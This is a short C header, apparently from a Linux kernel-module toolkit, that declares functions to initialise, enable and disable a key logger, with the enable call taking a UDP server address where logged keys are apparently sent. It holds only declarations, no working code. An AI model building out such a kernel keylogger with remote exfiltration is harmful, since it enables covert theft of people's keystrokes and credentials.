#ifndef LKM_TLSKIT_KEYLOGGER_H
#define LKM_TLSKIT_KEYLOGGER_H

#include <linux/in.h>

/**
 * Initialize key logging
 * @return 0 on success, -1 else
 */
int init_key_logger(void);

/**
 * Enable key logging
 * @param s_addr = IPv4 UDP server address
 * @return 0 on success, -1 else
 */
int enable_key_logger(struct sockaddr_in s_addr);

/**
 * Disable key logging
 */
void disable_key_logger(void);

#endif //LKM_TLSKIT_KEYLOGGER_H
